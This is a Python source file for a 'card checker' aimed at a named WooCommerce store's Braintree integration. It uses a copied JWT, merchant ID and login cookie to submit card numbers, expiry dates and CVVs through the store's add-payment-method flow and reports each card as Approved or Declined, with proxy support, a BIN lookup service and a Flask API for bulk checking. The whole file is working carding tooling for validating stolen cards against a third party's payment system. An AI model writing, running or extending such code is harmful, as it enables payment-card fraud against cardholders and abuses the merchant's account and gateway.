#!/usr/bin/env python3
"""
Braintree + WooCommerce (altairtech.io) card checker.
- CLI:  python3 bt_checker.py '4111111111111111|12|29|123'
- API:  gunicorn bt_checker:app  →  GET /braintree?card=...
"""
import os
import re
import sys
import json
import uuid
import base64
import random
import string
import time
from datetime import datetime

import requests
from flask import Flask, request, jsonify

# ═══════════════════════════════════════════════════════════════════════════
# CONFIG — edit these
# ═══════════════════════════════════════════════════════════════════════════
JWT = os.getenv("BT_JWT", "PASTE_JWT_HERE")
SITE = os.getenv("BT_SITE", "https://altairtech.io")
MERCHANT_ID = os.getenv("BT_MERCHANT_ID", "85fhvjhhq6j2xhk8")
WP_COOKIE_NAME = os.getenv("BT_WP_COOKIE_NAME",
                            "wordpress_logged_in_7c33bd78f71e082d62697d13f74a0021")
WP_COOKIE_VALUE = os.getenv("BT_WP_COOKIE_VALUE", "")
REQUEST_TIMEOUT = int(os.getenv("BT_TIMEOUT", "25"))
PROXY = os.getenv("BT_PROXY", "").strip() or None

BIN_API = "https://bins.antipublic.cc/bins/{}"

USER_AGENT = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36")

# ═══════════════════════════════════════════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════════════════════════════════════════
def _rand_corr():
    return uuid.uuid4().hex


def _session():
    s = requests.Session()
    s.headers.update({"user-agent": USER_AGENT})
    if PROXY:
        s.proxies.update({"http": PROXY, "https": PROXY})
    if WP_COOKIE_VALUE:
        s.cookies.set(WP_COOKIE_NAME, WP_COOKIE_VALUE, domain="altairtech.io")
    return s


def _jwt_expired(jwt):
    """Return True if the JWT is expired. Ignores malformed tokens."""
    try:
        parts = jwt.split(".")
        if len(parts) < 2:
            return True
        pad = "=" * (4 - len(parts[1]) % 4)
        payload = json.loads(base64.urlsafe_b64decode(parts[1] + pad))
        exp = payload.get("exp")
        return not exp or datetime.utcfromtimestamp(exp) < datetime.utcnow()
    except Exception:
        return True


def get_bin_info(bin_number):
    try:
        r = requests.get(BIN_API.format(bin_number), timeout=8)
        if r.status_code == 200:
            return r.json()
    except Exception:
        pass
    return {}


# ═══════════════════════════════════════════════════════════════════════════
# CORE CHECKER
# ═══════════════════════════════════════════════════════════════════════════
def check_card(cc, mm, yy, cvv, debug=False):
    """
    Returns:
      {
        "status": "Approved" | "Declined" | "Error",
        "response": str,
        "amount": "",       # not applicable for auth
        "gateway": "Braintree Auth",
        "bin_info": {...},
        "elapsed_ms": int
      }
    """
    started = time.time()

    def _fail(msg, status="Declined"):
        return {
            "status": status,
            "response": msg,
            "gateway": "Braintree Auth",
            "bin_info": get_bin_info(cc[:6]),
            "elapsed_ms": int((time.time() - started) * 1000),
        }

    # Sanitize
    cc = (cc or "").strip()
    mm = (mm or "").strip().zfill(2)
    yy = (yy or "").strip()
    cvv = (cvv or "").strip()
    if len(yy) == 4:
        yy = yy[-2:]
    if not (cc.isdigit() and len(cc) in (15, 16)):
        return _fail("Invalid card number", status="Error")
    if not (mm.isdigit() and 1 <= int(mm) <= 12):
        return _fail("Invalid expiry month", status="Error")
    if not (yy.isdigit() and len(yy) == 2):
        return _fail("Invalid expiry year", status="Error")
    if not (cvv.isdigit() and len(cvv) in (3, 4)):
        return _fail("Invalid CVV", status="Error")
    if not JWT or JWT == "PASTE_JWT_HERE":
        return _fail("BT_JWT not configured", status="Error")
    if _jwt_expired(JWT):
        return _fail("JWT expired — get a fresh one", status="Error")

    s = _session()

    # ── Step 1: get client token from Braintree GraphQL ─────────────────
    try:
        r = s.post(
            "https://payments.braintree-api.com/graphql",
            headers={
                "accept": "*/*",
                "authorization": f"Bearer {JWT}",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": SITE,
            },
            json={
                "clientSdkMetadata": {
                    "source": "client",
                    "integration": "custom",
                    "sessionId": str(uuid.uuid4()),
                },
                "query": ("query ClientConfiguration { clientConfiguration "
                          "{ braintreeApi { accessToken } } }"),
                "operationName": "ClientConfiguration",
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code != 200:
            return _fail(f"GraphQL HTTP {r.status_code}: {r.text[:120]}", status="Error")
        try:
            client_token = r.json()["data"]["clientConfiguration"]["braintreeApi"]["accessToken"]
        except Exception:
            return _fail(f"GraphQL parse failed: {r.text[:120]}", status="Error")
        if debug:
            print(f"[debug] client_token=...{client_token[-12:]}")
    except requests.Timeout:
        return _fail(f"Timeout at step 1 ({REQUEST_TIMEOUT}s)", status="Error")
    except Exception as e:
        return _fail(f"Step 1 {type(e).__name__}: {str(e)[:80]}", status="Error")

    # ── Step 2: tokenize the card into a nonce ──────────────────────────
    try:
        r = s.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/credit_cards",
            headers={
                "accept": "application/json",
                "braintree-version": "2018-05-10",
                "content-type": "application/json",
                "origin": SITE,
            },
            json={
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "_meta": {"integration": "custom", "source": "client"},
                "authorizationFingerprint": client_token,
            },
            timeout=REQUEST_TIMEOUT,
        )
        if r.status_code != 201:
            # Braintree returns 4xx with a JSON error body for card rejections
            try:
                err = r.json().get("error", {})
                msg = err.get("message") or err.get("errors") or r.text[:120]
            except Exception:
                msg = r.text[:120]
            return _fail(f"{msg}")
        try:
            payment_nonce = r.json()["creditCards"][0]["nonce"]
        except Exception:
            return _fail(f"Nonce parse failed: {r.text[:120]}", status="Error")
        if debug:
            print(f"[debug] nonce={payment_nonce[:24]}...")
    except requests.Timeout:
        return _fail(f"Timeout at step 2 ({REQUEST_TIMEOUT}s)", status="Error")
    except Exception as e:
        return _fail(f"Step 2 {type(e).__name__}: {str(e)[:80]}", status="Error")

    # ── Step 3: get a fresh WooCommerce nonce from the page ─────────────
    try:
        r = s.get(f"{SITE}/account/add-payment-method/", timeout=REQUEST_TIMEOUT)
        if "wp-login.php" in r.url or "my-account" in r.url and "add-payment" not in r.url:
            return _fail("WooCommerce cookie expired — login required", status="Error")
        m = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', r.text)
        if not m:
            return _fail("Could not find WooCommerce nonce in page", status="Error")
        site_nonce = m.group(1)
        if debug:
            print(f"[debug] wp_nonce={site_nonce}")
    except requests.Timeout:
        return _fail(f"Timeout at step 3 ({REQUEST_TIMEOUT}s)", status="Error")
    except Exception as e:
        return _fail(f"Step 3 {type(e).__name__}: {str(e)[:80]}", status="Error")

    # ── Step 4: submit nonce to WooCommerce ─────────────────────────────
    try:
        r = s.post(
            f"{SITE}/account/add-payment-method/",
            headers={
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "content-type": "application/x-www-form-urlencoded",
                "origin": SITE,
                "referer": f"{SITE}/account/add-payment-method/",
            },
            data={
                "payment_method": "braintree_credit_card",
                "wc_braintree_credit_card_payment_nonce": payment_nonce,
                "wc_braintree_device_data": json.dumps({"correlation_id": _rand_corr()}),
                "wc-braintree-credit-card-tokenize-payment-method": "true",
                "woocommerce-add-payment-method-nonce": site_nonce,
                "_wp_http_referer": "/account/add-payment-method/",
                "woocommerce_add_payment_method": "1",
            },
            timeout=REQUEST_TIMEOUT,
        )
    except requests.Timeout:
        return _fail(f"Timeout at step 4 ({REQUEST_TIMEOUT}s)", status="Error")
    except Exception as e:
        return _fail(f"Step 4 {type(e).__name__}: {str(e)[:80]}", status="Error")

    # ── Step 5: parse the response ──────────────────────────────────────
    txt = r.text
    status = "Declined"
    response_msg = "Unknown response from site"

    m = re.search(r"Status code\s*([^<]+)\s*</li>", txt)
    if m:
        response_msg = m.group(1).strip()
        status = "Declined"
    elif "Payment method successfully added." in txt:
        response_msg = "Payment method successfully added."
        status = "Approved"
    elif "woocommerce-error" in txt:
        errs = re.findall(r'<li[^>]*data-error[^>]*>(.*?)</li>', txt, re.DOTALL)
        if not errs:
            errs = re.findall(r'<li[^>]*>(.*?)</li>', txt, re.DOTALL)
        response_msg = " | ".join(re.sub(r"<[^>]+>", "", e).strip() for e in errs[:2]) or txt[:120]

    if debug:
        print(f"[debug] HTTP {r.status_code}  {len(txt)} bytes")

    return {
        "status": status,
        "response": response_msg,
        "gateway": "Braintree Auth",
        "bin_info": get_bin_info(cc[:6]),
        "elapsed_ms": int((time.time() - started) * 1000),
    }


# ═══════════════════════════════════════════════════════════════════════════
# FLASK API
# ═══════════════════════════════════════════════════════════════════════════
app = Flask(__name__)


@app.route("/", methods=["GET"])
def root():
    return jsonify({
        "service": "braintree-checker",
        "status": "online",
        "usage": "GET /braintree?card=4111111111111111|12|29|123",
        "health": "/health",
    })


@app.route("/health", methods=["GET"])
def health():
    jwt_ok = bool(JWT and JWT != "PASTE_JWT_HERE" and not _jwt_expired(JWT))
    return jsonify({
        "ok": True,
        "jwt_valid": jwt_ok,
        "cookie_set": bool(WP_COOKIE_VALUE),
        "proxy_set": bool(PROXY),
    })


@app.route("/braintree", methods=["GET"])
def braintree_endpoint():
    card = (request.args.get("card") or "").strip()
    if not card:
        return jsonify({"error": "missing ?card= parameter"}), 400

    m = re.match(r"(\d{15,16})[|:\s]+(\d{1,2})[|:\s]+(\d{2,4})[|:\s]+(\d{3,4})", card)
    if not m:
        return jsonify({"error": "invalid card format. use CC|MM|YY|CVV"}), 400
    cc, mm, yy, cvv = m.groups()

    result = check_card(cc, mm, yy, cvv)
    return jsonify(result)


# ═══════════════════════════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════════════════════════
if __name__ == "__main__":
    if len(sys.argv) >= 2 and not sys.argv[1].startswith("--"):
        # CLI mode
        line = sys.argv[1]
        m = re.match(r"(\d{15,16})[|:\s]+(\d{1,2})[|:\s]+(\d{2,4})[|:\s]+(\d{3,4})", line)
        if not m:
            print("Usage: python3 bt_checker.py '4111111111111111|12|29|123'")
            sys.exit(1)
        cc, mm, yy, cvv = m.groups()
        out = check_card(cc, mm, yy, cvv, debug="--debug" in sys.argv)
        print(json.dumps(out, indent=2))
    else:
        # API mode
        port = int(os.getenv("PORT", "10000"))
        print(f"Starting Braintree API on 0.0.0.0:{port}")
        app.run(host="0.0.0.0", port=port)
